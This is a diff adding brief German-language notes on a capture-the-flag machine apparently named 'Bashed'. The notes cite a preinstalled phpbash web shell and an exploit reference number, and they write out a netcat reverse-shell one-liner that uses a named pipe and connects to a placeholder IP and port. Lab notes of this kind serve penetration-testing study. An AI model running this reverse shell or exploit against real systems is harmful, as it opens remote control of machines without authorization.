@@ -1,0 +1,7 @@
+Bashed
+===============
+- phpbash-Shell vorinstalliert (/dev)
+- Reverse-Shell mit nc und named pipe:
+    - mknod /tmp/backpipe p
+    - /bin/sh 0</tmp/backpipe | nc <ip> <port> 1>/tmp/backpipe
+- Exploit 44298
